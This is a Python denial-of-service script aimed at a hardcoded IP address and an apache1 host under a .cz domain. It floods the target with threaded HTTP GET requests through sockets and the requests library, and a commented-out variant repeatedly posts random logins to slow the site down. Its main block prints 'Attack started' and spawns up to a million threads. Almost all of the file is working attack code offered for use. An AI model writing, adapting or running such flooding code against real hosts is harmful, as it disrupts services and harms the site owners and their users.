import threading
import time
import requests
import string
import random
import socket
import sys

# number of connections that were successfull
already_connected = 0
# number of errors
errors = 0
port = 80
current_error = ''

ip = '109.238.43.202'
target = ip
host = 'http://apache1.willilazarov.cz/'

try:
    host = str(ip).replace("https://", "").replace("http://", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print("IP doesn't mach url address")
    sys.exit(2)

# this one is able to slowdown website
"""
def login():
    msg = str(string.ascii_letters)
    random_username = "".join(random.sample(msg, 4))
    url = 'http://apache1.willilazarov.cz/'
    payload = {'username': random_username,
               'password': random_username,
               'login': 'login'
               }
    # infinite loop
    while 4 > 1:
        try:
            # instance to make a post request to the login url with  login details as a payload
            r = requests.Session()
            r.post(url, data=payload)
        except requests.exceptions.HTTPError as errh:
            print("Http Error:", errh)
        except requests.exceptions.ConnectionError as errc:
            print("Error Connecting:", errc)
        except requests.exceptions.Timeout as errt:
            print("Timeout Error:", errt)
        except requests.exceptions.RequestException as err:
            print("OOps: Something Else", err)
        finally:
            r.close()
"""

# Generate string with lowercase letters
def get_random_string(length):
    letters = string.ascii_lowercase
    return (''.join(random.choice(letters) for i in range(length)))


def dos_socket():
    fake_ip = get_random_string(8)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\n\n").encode('ascii'), (target, port))
        s.close()

        # or like this
        """
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        # Send the request according to HTTP spec
        msg = "GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host)
        byt = msg.encode('ascii')
        s.send(byt)
        s.close()
        """

        # number of connections that were successfull
        global already_connected
        already_connected += 1
        if already_connected % 500 == 0:
            print("Connected: " + str(already_connected))
    except socket.error as hmm:
        # prints error only if previous error was different
        """global current_error
        if str(hmm) != str(current_error):
            print(str(hmm))
        current_error = str(hmm)
        """
        # number of errors
        global errors
        errors += 1
        if errors % 200 == 0:
            print("Errors: " + str(errors))
        s.close()
        sys.exit()


# DoS attack with requests library
def dos_requests():
    _host = 'http://apache1.willilazarov.cz'
    # infinite loop
    while (1 < 4):
        try:
            # sending requests
            r = requests.get(_host)
            global already_connected
            already_connected += 1
            if already_connected % 500 == 0:
                print("Connected: " + str(already_connected))
            r.close()
        except requests.ConnectionError as eh:
            print("Connection error: " + str(eh))
            sys.exit()
        except requests.HTTPError as pth:
            print("HTTP error: " + str(pth))
            sys.exit()


if __name__ == '__main__':
    #number of threads that will be created
    num_requests = 1000000
    print("Attack started")
    # Spawn a thread per request
    all_threads = []
    for i in range(num_requests):
        new_thread = threading.Thread(target=dos_requests()) # or use (target=dos_socket)
        # thread dies if it exits!
        new_thread.Daemon = True
        new_thread.start()
        all_threads.append(new_thread)
        # Affect requests per second
        time.sleep(0.005)
    # Make the main thread wait for the other threads
    for current_thread in all_threads:
        current_thread.join()
